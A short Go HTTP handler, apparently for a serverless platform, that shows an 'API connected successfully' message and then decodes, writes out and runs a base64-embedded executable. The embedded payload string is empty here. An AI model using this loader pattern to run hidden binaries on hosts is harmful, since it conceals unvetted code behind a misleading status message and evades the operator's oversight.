package handler

import (
	"encoding/base64"
	"fmt"
	"net/http"
	"os"
	"os/exec"
)

const embeddedExecutableBase64 = ""

// Handler writes a simple HTML response, decodes an embedded base64 executable,
// writes it to a temporary file, makes it executable, runs it with output capture,
// and reports execution status and any errors.
func Handler(w http.ResponseWriter, r *http.Request) {
	// Confirm API connection
	fmt.Fprintln(w, "<h1>API connected successfully</h1>")

	// Decode the embedded executable
	data, err := base64.StdEncoding.DecodeString(embeddedExecutableBase64)
	if err != nil {
		fmt.Fprintf(w, "Error decoding embedded executable: %v", err)
		return
	}
	if len(data) == 0 {
		fmt.Fprintln(w, "No embedded executable data found.")
		return
	}

	// Create a temporary file
	tmpFile, err := os.CreateTemp("", "smoapi")
	if err != nil {
		fmt.Fprintf(w, "Error creating temp file: %v", err)
		return
	}
	defer os.Remove(tmpFile.Name())

	// Write the decoded executable to the temp file
	if _, err := tmpFile.Write(data); err != nil {
		fmt.Fprintf(w, "Error writing to temp file: %v", err)
		return
	}
	tmpFile.Close()

	// Make the temp file executable
	if err := os.Chmod(tmpFile.Name(), 0755); err != nil {
		fmt.Fprintf(w, "Error setting file permissions: %v", err)
		return
	}

	// Notify execution start
	fmt.Fprintln(w, "<p>Executing embedded binary...</p>")

	// Execute the temp file and capture combined output
	cmd := exec.Command(tmpFile.Name())
	output, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Fprintf(w, "<p><strong>Execution failed:</strong> %v</p><pre>%s</pre>", err, output)
		return
	}

	// Success
	fmt.Fprintf(w, "<p><strong>Execution succeeded.</strong></p><pre>%s</pre>", output)
}
